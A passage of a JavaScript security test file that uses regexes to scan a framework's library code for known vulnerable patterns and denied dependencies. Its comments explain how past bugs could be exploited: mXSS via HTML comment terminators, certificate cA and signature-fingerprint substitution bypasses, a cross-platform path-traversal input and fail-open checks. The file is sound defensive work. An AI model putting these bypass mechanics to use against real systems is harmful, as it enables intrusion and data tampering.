      var fp = _clusterFingerprint(first);
      return {
        file:    first.file,
        line:    first.line,
        content: "STRONG-DUP " + r.bestSize + "-tok in " + r.fileSet.length +
                 " files [fp:" + fp + "]: " + r.fileSet.slice(0, 5).join(", ") +
                 (r.fileSet.length > 5 ? " (+" + (r.fileSet.length - 5) + ")" : "") +
                 " — first @ " + first.file + ":" + first.line + "-" + first.endLine,
      };
    });
    strongMatches = _filterMarkers(strongMatches, "duplicate-block");
    _report("strong-signal duplicate code: " + STRONG_MIN_SIZE +
            "+ token exact shingle in " + STRONG_MIN_FILES + "+ files → " +
            "extract a shared primitive",
      strongMatches);
  } else {
    check("strong-signal duplicate-block (no clusters)", true);
  }
}

// ---- Pattern 43: url.format( — CVE-2026-21712 IDN crash class ----

function testNoLegacyUrlFormat() {
  // class: legacy-url-format
  // CVE-2026-21712 — Node's legacy `url.format()` crashes on
  // adversarial IDN inputs. The WHATWG URL constructor +
  // `safeUrl.format` are the supported paths. Even an internal
  // call site is a smoke risk: a future operator passing
  // operator-supplied data through the same function would crash
  // the listener.
  var matches = _scan(/\burl\.format\(/);
  matches = _filterMarkers(matches, "legacy-url-format");
  _report("url.format(...) — use safeUrl.format or new URL() constructor " +
          "(CVE-2026-21712 IDN crash class)", matches);
}

// ---- Pattern 43b: req.headersDistinct — CVE-2026-21710 prototype-poison ----

function testNoRawHeadersDistinct() {
  // class: raw-headers-distinct
  // CVE-2026-21710 — `req.headersDistinct` is implemented as a
  // getter; reading it on a request whose header bag carries a
  // `__proto__` key throws synchronously, before any handler-level
  // try/catch can engage. `b.requestHelpers.safeHeadersDistinct` is
  // the defensive replacement (skips poison keys, returns a null-
  // prototype object, never throws). The detector refuses any
  // direct `.headersDistinct` property access in lib/.
  var matches = _scan(/\.headersDistinct\b/);
  // request-helpers.js IS the safe wrapper; its JSDoc references
  // the symbol but the source-only filter already strips comment
  // lines. Belt-and-braces: skip the helper itself.
  matches = matches.filter(function (m) { return m.file !== "lib/request-helpers.js"; });
  matches = _filterMarkers(matches, "raw-headers-distinct");
  _report("req.headersDistinct routes through " +
          "b.requestHelpers.safeHeadersDistinct (CVE-2026-21710 prototype-poison crash class)",
    matches);
}

// ---- Pattern 43c: dense wildcard runs — CVE-2026-4923 router / picomatch ----

function testNoDenseWildcardRunsInLib() {
  // class: dense-wildcard
  // CVE-2026-4923 — multi-wildcard route / glob patterns compile
  // to catastrophic-backtracking regex on engines that fold `*`
  // into a regex alternation. The framework's router refuses at
  // registerRoute and the framework ships no picomatch / minimatch
  // dep, but a future change that lands one would be a regression.
  // Detector refuses any line in lib/ that carries 4+ consecutive
  // `*` metacharacters outside comments (handled by _scan's
  // skipComments). The regex is the bare run — no surrounding
  // string-literal anchors so the matcher can't itself
  // catastrophic-backtrack on long lines.
  var matches = _scan(/\*{4,}/);
  matches = _filterMarkers(matches, "dense-wildcard");
  _report("no source line carries 4+ consecutive '*' (CVE-2026-4923 " +
          "/ CVE-2026-33671 / CVE-2026-26996 wildcard-amplification class)",
    matches);
}

// ---- Pattern 43d: uncapped Object.fromEntries(URLSearchParams) ----

function testNoUncappedSearchParamsObject() {
  // class: uncapped-searchparams-object
  // CVE-2026-21717 — V8 HashDoS via integer-shaped query keys. A
  // request to `/?0=&1=&2=&...` flushed through
  // `Object.fromEntries(searchParams)` builds an object whose
  // hidden-class transitions degrade to O(n^2). Cap key count
  // before walking. The router's handle() applies the cap inline
  // (search for MAX_QUERY_KEYS); any other call site that walks
  // `searchParams` into a plain object without a cap is a smell.
  var matches = _scan(/Object\.fromEntries\([^)]*searchParams/);
  matches = _filterMarkers(matches, "uncapped-searchparams-object");
  _report("Object.fromEntries(searchParams) must enforce a key cap " +
          "(CVE-2026-21717 V8 HashDoS class)",
    matches);
}

// ---- Pattern 44: vendor-deny — axios / xml-crypto / saml class ----

// CVE-2026-25639 / 42033 / 42041 / 40175 — axios prototype-pollution.
// CVE-2026-25922 / 23687 / 34840 — SAML XML signature wrapping (xml-crypto class).
// The framework is zero-npm-runtime-deps; this gate ensures no vendor
// refresh or careless file lands a require() against these packages.
var VENDOR_DENY_NAMES = [
  { name: "axios",      cve: "CVE-2026-25639/42033/42041/40175 prototype-pollution" },
  { name: "xml-crypto", cve: "CVE-2026-25922/23687/34840 SAML XML signature wrapping" },
  { name: "xml2js",     cve: "SAML XML wrapping class — operator must use a documented opt-in path" },
  { name: "samlify",    cve: "SAML signature-wrapping class — operator must use a documented opt-in path" },
];

function testNoDeniedVendors() {
  // class: vendor-deny
  var files = _libFiles();
  var bad = [];
  for (var fi = 0; fi < files.length; fi++) {
    var rel = _relPath(files[fi]);
    var content;
    try { content = fs.readFileSync(files[fi], "utf8"); }
    catch (_e) { continue; }
    var lines = content.split(/\r?\n/);
    for (var li = 0; li < lines.length; li++) {
      var line = lines[li];
      if (/^\s*(\/\/|\*|\/\*)/.test(line)) continue;
      for (var di = 0; di < VENDOR_DENY_NAMES.length; di++) {
        var d = VENDOR_DENY_NAMES[di];
        var re = new RegExp("require\\([\"']" + d.name + "[\"']\\)");
        if (re.test(line)) {
          bad.push({
            file:    rel,
            line:    li + 1,
            content: "require('" + d.name + "') — vendor-denied (" + d.cve + ")",
          });
        }
      }
    }
  }
  bad = _filterMarkers(bad, "vendor-deny");
  _report("vendor-deny — refused dependencies (axios / xml-crypto / SAML class)",
    bad);
}

// ---- Pattern 42: state-stamps in user-facing docs (smoke test the wiki) ----

function testStateStampScanningDeferred() {
  // feedback_no_state_stamps_in_docs.md — version numbers / test counts
  // in README / SECURITY / CONTRIBUTING etc. rot the moment the next
  // release ships. We can't easily grep these via the lib walker, but
  // we can grep the repo root for "v0.6.\d+" outside CHANGELOG / git
  // tags / package.json. Skip for now — needs a different scanner that
  // walks the repo root, not just lib/. Future patch.
  check("state-stamp scanning requires a repo-root walker (deferred)",
        true);
}

// KNOWN_ANTIPATTERNS — n=1 hard gate.
//
// Each entry registers the inline shape of code that has been replaced
// by a framework primitive. Any future file matching the regex
// hard-fails with a pointer to the primitive — even at n=1, before the
// duplicate-block detector (which needs n>=5) would notice.
//
// Why this exists: the duplicate-block detector catches drift that has
// already proliferated; the catalog catches drift the moment it tries
// to land. When a new primitive is extracted from N call sites, the
// inline shape is registered here in the SAME patch so a subsequent
// file written from muscle memory hits the gate immediately.
//
// Discipline:
//   1. Every primitive extraction adds an entry here in the same patch.
//   2. `allowlist` is the audit trail. New entries default to []
//      because the extraction was complete at registration time.
//   3. Adding a file to `allowlist` later requires a documented reason
//      in the entry's `reason` field. The pre-ship rules audit calls
//      out every allowlist change.
//   4. The catalog scans whole-file content (multiline regex) so
//      patterns split across lines still match.
var KNOWN_ANTIPATTERNS = [
  {
    id: "use-makeProfileResolver-not-handrolled",
    primitive: "b.gateContract.makeProfileResolver",
    scanScope: "lib",
    skipCommentLines: true,
    regex: /function\s+_resolveProfile\s*\(/,
    allowlist: ["lib/safe-sieve.js"],
    reason: "v0.15.0 #103 — profile resolution (posture->profile map, profile||default, validate-or-throw on unknown) is owned by gateContract.makeProfileResolver; 24 guards reuse it. A hand-rolled `function _resolveProfile(opts)` re-implements the solved primitive and drifts downstream — this exact dup was previously ALLOWLISTED in KNOWN_CLUSTERS before extraction (feedback_codebase_patterns_is_a_drift_signal). lib/safe-sieve.js is the one genuine holdout (reads the public opts.compliancePosture not opts.posture, returns opts.profile unvalidated, never throws) pending its contract decision in task #104. Any other lib file declaring _resolveProfile must call gateContract.makeProfileResolver instead.",
  },
  {
    id: "use-throwOnRefusalSeverity-not-handrolled",
    primitive: "b.gateContract.throwOnRefusalSeverity",
    scanScope: "lib",
    skipCommentLines: true,
    regex: /ruleId\s*\|\|\s*['"][a-zA-Z0-9_-]+\.refused['"]/,
    allowlist: ["lib/guard-auth.js"],
    reason: "v0.15.0 #103 — the guard sanitize/parse refuse-on-critical|high throw (err(issue.ruleId || '<x>.refused', 'guard<Name>.<op>: ' + issue.snippet)) is owned by gateContract.throwOnRefusalSeverity; 18 guards reuse it (this was the failing STRONG-DUP fp:f349a8d1f51b before extraction). A hand-rolled `issues[i].ruleId || '<x>.refused'` throw re-implements it. lib/guard-auth.js is the one genuine holdout (its message embeds issues[i].source: 'guardAuth.sanitize [<source>]:') pending task #104; the primitive itself uses a `fallback` variable (no .refused literal) so it does not match. Any other lib file with this shape must call gateContract.throwOnRefusalSeverity (the severities / op options cover the critical-only + parse variants).",
  },
  {
    id: "html-comment-scan-must-use-htmlCommentEnd",
    primitive: "b.markupTokenizer.htmlCommentEnd",
    scanScope: "lib",
    skipCommentLines: true,
    // The WHATWG HTML tokenizer closes a comment at "--!>" and ABRUPTLY at
    // "<!-->" / "<!--->", not only "-->". An HTML/SVG-in-HTML scanner that
    // searches indexOf("-->") disagrees with the browser on the comment
    // boundary, so an element after an early terminator is swallowed as inert
    // comment by the sanitizer but parsed LIVE by the browser (mXSS, the
    // comment-parser differential). markupTokenizer.htmlCommentEnd owns the
    // correct scan; guard-html / guard-svg / mail-bimi / html-balance route
    // through it. XML comment scanners (safe-xml, xml-c14n) legitimately use
    // "-->" because XML has neither "--!>" nor abrupt-close forms.
    regex: /\.indexOf\("-->"/,
    allowlist: ["lib/markup-tokenizer.js", "lib/parsers/safe-xml.js", "lib/xml-c14n.js"],
    reason: "HTML/SVG-in-HTML comment scanning must use markupTokenizer.htmlCommentEnd (covers --!> + abrupt <!-->/<!--->), not a bare indexOf('-->'). XML scanners are exempt (XML has no such forms); markup-tokenizer.js is the primitive's home.",
  },
  {
    id: "x509-issuer-check-must-enforce-ca",
    primitive: "b.x509Chain.issuerValidlyIssued",
    scanScope: "lib",
    skipCommentLines: true,
    // node:crypto X509Certificate.checkIssued() does NOT enforce
    // basicConstraints cA:TRUE, so `subject.checkIssued(issuer)` used to
    // accept a leaf / end-entity cert (cA:FALSE, no keyUsage) as a signing
    // CA — the basicConstraints bypass (CVE-2002-0862 class) that hit
    // tsa.js / mail-bimi.js / mail-crypto-smime.js. Every chain walker now
    // routes its issuer test through x509Chain.issuerValidlyIssued (which
    // adds the cA check). A hand-rolled `receiver.checkIssued(otherArg)`
    // re-introduces the gap. The negative backref skips the legitimate
    // self-signed-root probe `current.checkIssued(current)` (same receiver
    // + arg), which is not an issuer-acceptance use.
    regex: /\b(\w+)\.checkIssued\s*\(\s*(?!\1[\s,)])\w/,
    allowlist: ["lib/x509-chain.js"],
    reason: "basicConstraints cA:TRUE enforcement is owned by x509Chain.issuerValidlyIssued / x509Chain.isCaCert; tsa/mail-bimi/mail-crypto-smime route through it. Any lib file calling X.checkIssued(Y) (Y!=X) directly bypasses the cA check and must use x509Chain instead. lib/x509-chain.js is the home of the primitive.",
  },
  {
    id: "fingerprint-pin-against-claimed-field-not-recomputed",
    primitive: "b.auditSign.fingerprintOf",
    scanScope: "lib",
    skipCommentLines: true,
    // A fingerprint PIN (expectedFingerprint, supplied out-of-band by the
    // verifier) must be checked against a fingerprint RECOMPUTED from the
    // signature block's own publicKey — fingerprintOf(block.publicKey) — NOT
    // the block's self-asserted `.fingerprint` field. An attacker controls that
    // field: sign arbitrary bytes with their OWN key, set `fingerprint` to the
    // trusted value, and a `block.fingerprint === expectedFingerprint` check
    // passes while the signature still verifies under the attacker's key (the
    // backup-manifest verifyBytes/verifySignature P1 substitution bug). Binding
    // the pin to fingerprintOf(publicKey) — the key the signature is actually
    // verified under — closes the substitution. Fires on either argument order.
    regex: /(?:[\w.]+\.fingerprint\s*[!=]==\s*[\w.]*\bexpectedFingerprint\b|\bexpectedFingerprint\b\s*[!=]==\s*[\w.]+\.fingerprint\b)/,
    allowlist: [],
    reason: "A fingerprint pin must be compared against auditSign.fingerprintOf(<the block's publicKey>) — the key the signature verifies under — never the block's untrusted self-asserted `.fingerprint` field (an attacker sets that to the trusted value while signing with their own key). backup/manifest.js _verifyPayloadAgainstBlock recomputes via derivedFingerprint = fingerprintOf(sig.publicKey). Any `X.fingerprint === expectedFingerprint` (either order) re-introduces the substitution bypass and must recompute instead.",
  },
  {
    id: "platform-parameterized-containment-resolves-with-runtime-path-module",
    primitive: "b.safePath (target-platform lexical resolve)",
    scanScope: "lib",
    skipCommentLines: true,
    // A path validator parameterized by opts.platform must resolve AND bound its
    // LEXICAL containment with the TARGET platform's path module
    // (`pathMod = isWin ? nodePath.win32 : nodePath.posix`), not the runtime
    // node:path. The per-segment walk already splits on the target separator
    // (`sep = isWin ? /[\\/]/ : /\//`); if the lexical resolve uses runtime
    // semantics they disagree. On a POSIX host validating opts.platform:
    // "windows", runtime node:path treats `\` as an ordinary filename char, so
    // `ok\..\..\outside` was NOT collapsed and slipped past the boundary slice —
    // resolving to `<base>/ok\..\..\outside`, a path that escapes the base once a
    // Windows consumer reads the backslashes (Codex P1, PR #372). The realpath
    // check hits the live filesystem and legitimately keeps a SEPARATE runtime
    // resolve under distinctly-named vars (rtBaseResolved / rtJoined / rtSep), so
    // those don't match this anchor. Fires if the lexical `joined` reverts to
    // `nodePath.resolve(baseResolved, ...)` or `sepChar` to `nodePath.sep`.
    regex: /\bjoined\s*=\s*nodePath\.resolve\s*\(\s*baseResolved|\bvar\s+sepChar\s*=\s*nodePath\.sep\b/,
    allowlist: [],
    reason: "b.safePath.resolve refuses traversal lexically by resolving rel under base and slicing on the containment boundary. When validating for a non-runtime platform (opts.platform), the lexical resolve + boundary separator MUST come from the target module (pathMod = isWin ? nodePath.win32 : nodePath.posix) so they share the per-segment walk's platform semantics — otherwise a separator the target treats as a delimiter (the Windows backslash) is treated as a filename char by the runtime resolver and a cross-platform `ok\\..\\..\\outside` traversal escapes the base. The realpath check keeps a separate runtime resolve (rtBaseResolved/rtJoined/rtSep) because it touches the live FS. Reverting the lexical `joined`/`sepChar` to runtime nodePath re-opens the cross-platform traversal hole.",
  },
  {
    id: "compose-pipeline-settle-on-response-ended-not-return",
    primitive: "b.middleware.composePipeline",
    scanScope: "lib",
    skipCommentLines: true,
    // The REGULAR (3-arg) middleware branch must settle on a HALT (the
    // response ended), never merely because the middleware FUNCTION returned —
    // a callback-style middleware that calls next() later (timer/stream/legacy)
    // returns with advanced===false but is NOT halted; a bare `if (!advanced)`
    // resolve there marks the pipeline finished so the deferred next() is
    // ignored and the chain stalls (Codex PR#357). The fix gates on the
    // response: `if (!advanced && _responseEnded(res))`. Anchored on the 3-arg
    // call `entry.mw(req, res, _next)` so it targets ONLY the regular branch —
    // the error-handler branch (`entry.mw(err, req, res, _next)`) legitimately
    // settles on a bare `if (!advanced)` per the Express "no next = handled"
    // convention and must not be flagged.
    regex: /entry\.mw\(req, res, _next\)[\s\S]{0,200}?if \(\s*!advanced\s*\)\s*_resolveOnce/,
    allowlist: [],
    reason: "the REGULAR-middleware settle in compose-pipeline must be response-gated (`if (!advanced && _responseEnded(res))`), not a bare `if (!advanced) _resolveOnce()` — the bare form breaks callback-style deferred-next middleware (Codex PR#357). The behavioral guard is testDeferredNextContinuesChain; this detector anchors on the 3-arg entry.mw(req, res, _next) call so the error-handler branch's legitimate bare settle is not matched.",
  },
  {
    id: "ciba-authreqid-binding-not-truthiness-gated",
    primitive: "b.auth.ciba",
    scanScope: "lib",
    skipCommentLines: true,
    // The CIBA id_token auth_req_id binding must not be guarded by a bare
    // truthiness test: an empty-string auth_req_id (a valid-typed but falsy
    // value reaching the helper from a push notification body) would skip the
    // substitution defense entirely (Codex PR#357 — same class as the oauth
    // empty-nonce fail-open). The fixed form fails closed:
    // `if (typeof expectedAuthReqId !== "string" || expectedAuthReqId.length === 0)`.
    // `expectedAuthReqId` is unique to ciba.js, so no allowlist is needed.
    regex: /if\s*\(\s*expectedAuthReqId\s*\)/,
    allowlist: [],
    reason: "the CIBA auth_req_id binding must fail closed on an empty/missing id (`typeof x !== 'string' || x.length === 0`), never skip behind a bare `if (expectedAuthReqId)` — a falsy auth_req_id otherwise bypasses the cross-user token-substitution defense (Codex PR#357).",
  },
  {
    id: "trusted-proxy-cidr-must-canonicalize-peer",
    primitive: "b.requestHelpers.trustedClientIp",
    scanScope: "lib",
    skipCommentLines: true,
    // The peer-gating trustedProxies predicate matches the immediate peer
    // address against operator CIDRs. cidrContains refuses a cross-family
    // compare, so an IPv4-mapped IPv6 peer (::ffff:a.b.c.d from a dual-stack
    // listener) silently fails an IPv4 CIDR and the proxy reads as untrusted —
    // X-Forwarded-* is then ignored and the gate keys on the proxy. The peer
    // MUST be folded through ssrfGuard.canonicalizeHost (var canon) first; a
    // raw `cidrContains(trustedProxies[i], addr)` re-introduces the bypass.
    regex: /cidrContains\(trustedProxies\[\w+\],\s*(?!canon\b)\w/,
    allowlist: [],
    reason: "Match the immediate peer against trustedProxies only after folding IPv4-mapped IPv6 via ssrfGuard.canonicalizeHost (the `canon` local) — cidrContains rejects a cross-family compare, so a raw peer addr lets a dual-stack proxy read as untrusted. request-helpers.js's _trustedProxyPredicate owns this.",
  },
  {
    id: "http-upload-content-length-must-guard-transform",
    primitive: "b.httpClient.request",
    scanScope: "lib",
    skipCommentLines: true,
    // A Content-Length set from a Buffer body's length is wrong once a
    // size-changing uploadTransform (gzip / encrypt / frame) is interposed —
    // the server truncates extra bytes or waits for bytes that never arrive.
    // The assignment must be guarded by `uploadTransforms.length === 0` so a
    // transformed body is framed (chunked / DATA frames) on its real size.
    regex: /Buffer\.isBuffer\(opts\.body\)(?:(?!uploadTransforms)[\s\S]){0,400}?content-length"\]\s*=\s*(?:String\()?opts\.body\.length/i,
    allowlist: [],
    reason: "Set Content-Length from opts.body.length only when uploadTransforms.length === 0 — a size-changing uploadTransform makes the original length wrong (truncation / hang). Omit it (chunked / H2 DATA frames) when a transform is present. lib/http-client.js owns both legs.",
  },
  {
    id: "http-response-collect-must-use-download-pipeline",
    primitive: "b.httpClient.request",
    scanScope: "lib",
    skipCommentLines: true,
    // The buffered (non-stream) response collector must read from the
    // _buildDownloadStream pipeline tail, not the raw socket stream — reading
    // `res`/`stream` directly bypasses maxBytesPerSec + downloadTransform in
    // buffer / always-resolve mode (the documented default), so a configured
    // throttle / transform silently no-ops. Anchored on the full-response
    // collector (maxResponseBytes) so the bounded error-prefix reader is not
    // matched.
    regex: /boundedChunkCollector\(\{ maxBytes: maxResponseBytes \}\)(?:(?!_buildDownloadStream)[\s\S]){0,300}?\b(?:res|stream)\.on\("data"/,
    allowlist: [],
    reason: "Feed the full-response collector from _buildDownloadStream(...) (the dlSource / dlH2 tail), never raw res/stream .on('data') — otherwise maxBytesPerSec / downloadTransform apply only in stream mode. lib/http-client.js owns both H1 + H2 paths.",
  },
  {
    // A hard quota / rate / budget ceiling must be enforced with an
    // atomic conditional reserve — the limit test and the charge are
    // one indivisible operation ("add only if current + amount fits").
    // Charge-then-refund (an unconditional `incrBy` followed by a
    // compensating `decrBy` on overflow) transiently inflates a shared
    // counter: under cross-node concurrency a smaller call that should
    // fit can be falsely denied while an over-budget call's charge is
    // still pending its refund. The textual tell of that broken shape
    // is a counter store that exposes / requires a `decrBy` refund op.
    // b.ai.quota originally shipped the refund shape and was reworked
    // to `store.reserve` (Codex P1 on PR #178, v0.12.27).
    id: "limit-store-charge-then-refund",
    primitive: "atomic conditional reserve (limit test + charge as one operation) for hard quota / rate / budget enforcement — see lib/ai-quota.js store.reserve; never charge-then-refund (incrBy + a compensating decrBy)",
    regex: /\bdecrBy\b/,
    allowlist: [],
    reason: "Hard quota / rate / budget ceilings must be enforced with an atomic conditional reserve (the limit test and the charge are one indivisible operation), never charge-then-refund (an unconditional increment plus a compensating `decrBy`). The refund shape transiently over-counts a shared counter and falsely denies concurrent calls that should fit (Codex P1 on PR #178, v0.12.27 — b.ai.quota originally shipped this shape and was reworked to store.reserve). A future store that genuinely needs a decrement for a non-ceiling gauge metric allowlists with a structural reason explaining why no limit decision reads the counter mid-refund.",
  },
  {
    // The cross-border residency WRITE gate must classify writes by what
    // a statement DOES, not by its leading keyword. A statement whose
    // effective verb is hidden behind a prefix — `WITH ... INSERT`,
    // `EXPLAIN ANALYZE INSERT` (Postgres EXECUTES the wrapped write),
    // `CALL` / `EXECUTE` / `DO`, `COPY ... FROM`, `REPLACE` — reads as a
    // harmless leading keyword and slips past a gate that enforces only
    // on `class === "DML"`. lib/external-db.js resolves WITH / EXPLAIN
    // prefixes to the effective verb in _classifyStatement and gates via
    // a positive pure-read exempt set (_RESIDENCY_READ_CLASS), treating
    // everything else — DML, ROUTINE, a COPY load, an unresolved or
    // unmapped statement — as a write that requires a residency tag
    // (Codex P1 on PR #304 flagged the WITH-wrapped-DML instance; the
    // COPY / EXPLAIN-ANALYZE / CALL / REPLACE / DO siblings were
    // confirmed in the same review). Comparing the statement class to
    // the single string "DML" reintroduces the bypass.
    id: "residency-gate-dml-equality",
    primitive: "gate SQL writes by a positive pure-read exempt set that resolves WITH/EXPLAIN prefixes and fails closed on unknown (lib/external-db.js _RESIDENCY_READ_CLASS + _classifyStatement); never discriminate writes by leading-keyword equality to a single class string like \"DML\"",
    regex: /[!=]==\s*["']DML["']/,
    allowlist: [],
    reason: "The cross-border residency write gate must enforce on what a statement DOES, not its leading keyword. `WITH ... INSERT`, `EXPLAIN ANALYZE INSERT` (Postgres EXECUTES the wrapped write), `CALL` / `EXECUTE` / `DO`, `COPY ... FROM`, and `REPLACE` all place rows while reading as a harmless prefix, so a gate enforcing only on `class === \"DML\"` waves them across a border untagged (Codex P1 on PR #304 flagged the WITH instance; the verifier confirmed the COPY / EXPLAIN-ANALYZE / CALL / REPLACE / DO siblings). lib/external-db.js resolves WITH / EXPLAIN to the effective verb in _classifyStatement and gates via the positive _RESIDENCY_READ_CLASS exempt set, treating every non-read (DML, ROUTINE, a COPY load, an unmapped or unresolved statement) as a write that needs a tag. A forensic-only comparison that does not gate a write may allowlist with a structural reason naming why no transfer decision rides on it.",
  },
  {
    // A per-row / per-record crypto-shred key (K_row) — or a keyed-MAC
    // that advertises vault-secret protection — must seed off a CSPRNG
    // secret (b.crypto.generateBytes) or the SEALED-at-rest
    // b.vault.getDerivedHashMacKey(), NEVER off kdf() over the
    // PLAINTEXT-on-disk b.vault.getDerivedHashSalt(). A key whose entire
    // input is recomputable from the data directory is re-derivable by a
    // disk-access attacker, so destroying the wrapped form shreds nothing
    // and a keyed-MAC over a low-entropy preimage is brute-forceable
    // offline — defeating the exact secrecy/erasure the primitive
    // advertises (v0.14.25: the per-row-key K_row and the idempotency
    // fingerprint HMAC both shipped this shape and were reseeded).
    // The salted-sha3 derived-hash INDEX (crypto-field.js:325) uses the
    // plaintext salt via sha3Hash() — a deterministic equality index that
    // disclaims MAC-grade secrecy, a DIFFERENT shape (not kdf) — so it
    // does not match and is covered by its own detector.
    id: "kdf-key-from-plaintext-derived-hash-salt",
    primitive: "seed per-row crypto-shred keys / vault-secret keyed-MACs from a CSPRNG secret (b.crypto.generateBytes) or the sealed b.vault.getDerivedHashMacKey(); never kdf() over the plaintext-on-disk b.vault.getDerivedHashSalt()",
    regex: /\bkdf\s*\([^\n]*getDerivedHashSalt\s*\(/,
    allowlist: [],
    reason: "v0.14.25 — the per-row-key K_row was kdf(...getDerivedHashSalt()...) over the PLAINTEXT-on-disk salt, so a disk-access attacker re-derived it and destroyPerRowKey/eraseHard shred NOTHING (advertised as crypto-shred since v0.7.27, false); the idempotency fingerprint HMAC seeded off the same plaintext salt despite promising the vault root was the trust root. Both reseeded — K_row onto a fresh b.crypto.generateBytes(32) row-secret AAD-wrapped via b.vault.aad.seal, the fingerprint HMAC onto the sealed b.vault.getDerivedHashMacKey() (since v0.14.7). This detector refuses the inline regression `kdf(...getDerivedHashSalt()...)`; the legitimate `kdf(getDerivedHashMacKey()...)` (the sealed key) and the `sha3Hash(getDerivedHashSalt()...)` deterministic equality index are different shapes and do not match. NOTE the historical bug assigned the salt to a var first (`saltHex = getDerivedHashSalt()...; kdf(...saltHex...)`) — a data-flow shape regex can't trace, so reviewers must also reject any kdf/HMAC key whose IKM transitively names getDerivedHashSalt.",
  },
  {
    // A break-glass grant pin (pinIp / sessionPin — both documented
    // default-ON) binds redemption to the IP / session captured when the
    // grant was minted. The enforcement MUST fail closed when the
    // captured binding is absent: a grant that recorded no IP (or no
    // session) is refused, never waved through. The historical fail-open
    // was a `grantRow.ip != null &&` short-circuit around the comparison
    // — "no binding recorded, so there is nothing to check, so allow" —
    // which lets a grant minted without a binding be redeemed from any
    // origin, defeating the pin exactly when it is the only control left.
    // The fixed shape is `if (grantRow.ip == null) throw ...` BEFORE the
    // `redeemIp !== grantRow.ip` comparison (see _enforceGrantPins). The
    // `grantRow.` receiver is unique to lib/break-glass.js, so this
    // bad-shape regex needs no companion; skipCommentLines keeps the
    // narrative comment that quotes the bad form from self-matching.
    id: "break-glass-pin-fails-open-on-null-binding",
    primitive: "fail closed in break-glass pin enforcement — refuse a grant whose pinIp/sessionPin binding was never captured (if grantRow.ip == null throw); never short-circuit the comparison with a `grantRow.ip != null &&` guard that treats an absent binding as 'nothing to check, allow'",
    regex: /grantRow\.(?:ip|sessionId)\s*!=\s*null\s*&&/,
    skipCommentLines: true,
    allowlist: [],
    reason: "pinIp / sessionPin are documented default-ON; redemption binds to the IP / session captured at mint time. A `grantRow.ip != null &&` (or sessionId) guard around the pin comparison fails OPEN: a grant minted without a captured binding skips the check and is redeemable from any origin — the pin's whole point is lost in the one case it must hold. Enforce by refusing the unbound grant first (`if (grantRow.ip == null) throw`), then comparing. Resolve the redeeming client IP from the redemption request (falling back to req.ip), not from a value the redeemer can omit.",
  },
  {
    // The b.dsr database-backed ticket store holds the data subject's
    // identifiers and the raw request payload — PII under GDPR Art. 15 /
    // 17 that an erasure request must be able to destroy. Those columns
    // MUST be sealed via cryptoField.registerTable(DSR_SEAL_TABLE, { aad:
    // true, ... }) so the row's plaintext is encrypted at rest and goes
    // with the shredded row key; storing them plaintext leaves
    // un-erasable PII and defeats b.subject.eraseHard for DSR tickets.
    // DSR_SEAL_TABLE is unique to lib/dsr.js; the companion `requires`
    // exempts the file once the registerTable call is present (the fix),
    // so this fires only if a future edit drops the registration while
    // keeping the table.
    id: "dsr-ticket-store-pii-must-be-sealed",
    primitive: "seal the b.dsr database ticket store's subject identifiers + request payload via cryptoField.registerTable(DSR_SEAL_TABLE, { aad: true, columns: [...] }); plaintext PII in the ticket store is un-erasable and defeats DSR erasure",
    regex: /\bDSR_SEAL_TABLE\b/,
    requires: /registerTable\s*\(\s*DSR_SEAL_TABLE/,
    allowlist: [],
    reason: "The DSR dbTicketStore persists the data subject's identifiers and the raw request body — the exact PII an Art. 17 erasure must destroy. Those columns must be sealed via cryptoField.registerTable(DSR_SEAL_TABLE, { aad: true }) so they are encrypted at rest under a per-row key bound to (table, rowId) and shredded with the row; leaving them plaintext means an erasure request cannot delete the data it is processing. The companion registerTable(DSR_SEAL_TABLE call satisfies the discipline; this entry fires only if the registration is removed while the table remains.",
  },
  // #114 — legal-hold + subject-restriction local tables seal their PII columns.
  {
    id: "legal-hold-store-pii-must-be-sealed",
    primitive: "seal the b.legalHold _blamejs_legal_hold PII columns (reason/placedBy/custodian/citation) via cryptoField.sealRow(HOLD_TABLE, ...) on insert + unseal on read — the legal-basis / custodian / citation free text links a data subject to a legal matter and must not be stored plaintext",
    regex: /sql\.insert\(HOLD_TABLE/,
    requires: /\bsealRow\(HOLD_TABLE/,
    skipCommentLines: true,
    allowlist: [],
    reason: "#114 — _blamejs_legal_hold stored legal-basis / custodian / ticket-citation free text in clear via the raw sql.insert + db.prepare().run() path, which bypasses the structured builder's auto-seal. db.js declares sealedFields on the table; legal-hold.js must seal on write (cryptoField.sealRow(HOLD_TABLE, ...)) and unseal on read (get/list/release). Fires if an insert into HOLD_TABLE lands without the seal.",
  },
  {
    id: "subject-restriction-store-pii-must-be-sealed",
    primitive: "seal the b.subject restriction reason (a PII ticket reference) via cryptoField.sealRow(RESTRICTIONS_TABLE, ...) on insert into _blamejs_subject_restrictions",
    regex: /sql\.insert\(RESTRICTIONS_TABLE/,
    requires: /\bsealRow\(RESTRICTIONS_TABLE/,
    skipCommentLines: true,
    allowlist: [],
    reason: "#114 — _blamejs_subject_restrictions declares sealedFields:[\"reason\"] but subject.js wrote the reason in clear via the raw sql.insert path. Seal on write (cryptoField.sealRow(RESTRICTIONS_TABLE, ...)); the reason is write-only (isRestricted reads only the PK) so there is no unseal site. Fires if the restriction insert lands without the seal.",
  },
  {
    // Vault keypair rotation stages every output file (the re-encrypted
    // db, resealed vault/db keys, additional sealed files, derived-hash
    // material, and the transient PLAINTEXT db) inside opts.stagingDir.
    // Those writes must go through _writeStagedFileExclusive — O_CREAT |
    // O_EXCL | O_NOFOLLOW, owner-only 0o600 — so a same-user pre-planted
    // file or symlink swap in the staging dir is a hard failure rather
    // than a followed write (CWE-377 / CWE-379 / CWE-59). A raw
    // nodeFs.writeFileSync into the staging dir (or to the tmpDbPath /
    // verifyTmp markers) follows whatever is already at the path. The
    // identifiers tmpDbPath / verifyTmp / stagingDir are unique to
    // lib/vault/rotate.js, so this bad-shape regex self-scopes there and
    // needs no companion; the exclusive helper's own write targets an fd,
    // not these names, so it does not match.
    id: "vault-rotate-staged-write-not-exclusive",
    primitive: "write vault-rotation staging files via lib/vault/rotate.js _writeStagedFileExclusive (O_CREAT|O_EXCL|O_NOFOLLOW, 0o600); never raw nodeFs.writeFileSync into opts.stagingDir or the tmpDbPath/verifyTmp markers — a non-exclusive create follows a pre-planted file/symlink in the staging dir (CWE-377/379/59)",
    regex: /writeFileSync\s*\(\s*(?:tmpDbPath\b|verifyTmp\b|nodePath\.join\(\s*stagingDir)/,
    allowlist: [],
